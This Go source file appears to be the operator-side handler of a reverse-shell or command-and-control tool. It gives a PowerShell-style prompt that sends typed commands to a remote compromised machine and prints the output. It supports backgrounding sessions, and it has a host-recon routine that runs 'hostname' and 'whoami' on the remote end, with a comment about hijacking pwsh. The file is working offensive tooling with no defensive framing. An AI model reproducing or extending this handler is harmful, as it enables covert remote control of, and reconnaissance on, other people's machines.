package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

func shell(conn *net.Conn) {
	reader := bufio.NewReader(os.Stdin)
L: //Labeled the for loop with L if i need to break it from switch. Faster than if statements. Works.
	for {
		fmt.Print("PS > ")
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input:", err)
			continue
		}
		switch command {
		case "\n":
			continue
		case "cls\n":
			continue
		case "bg\n":
			break L
		case "exit\n":
			break L
		default:
			(*conn).Write([]byte(command))
			//time.Sleep(1 * time.Second) Ma ila 3azeh only for testing
			request := make([]byte, 9000)
			read_len, err := (*conn).Read(request)
			if read_len == 0 {
				fmt.Println("Read Length is 0")
			}
			if err != nil {
				os.Exit(0)
			}
			reply := string(request[:read_len])
			fmt.Println(reply)
		}
	}
}

func hostinfo(conn *net.Conn) { //Should be able to execute these by hijacking pwsh
	fmt.Println()
	(*conn).Write([]byte("hostname\n"))
	request := make([]byte, 9000)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		fmt.Println("Read Length is 0")
	}
	if err != nil {
		os.Exit(0)
	}
	hostname := string(request[:read_len])
	(*conn).Write([]byte("whoami\n"))
	read_len, err = (*conn).Read(request)
	if read_len == 0 {
		fmt.Println("Read Length is 0")
	}
	if err != nil {
		os.Exit(0)
	}
	whoami := string(request[:read_len])
	fmt.Print("Hostname: " + hostname) //Hostname gets recieved with \n so we can leave it this way
	fmt.Println("User: " + whoami)
}
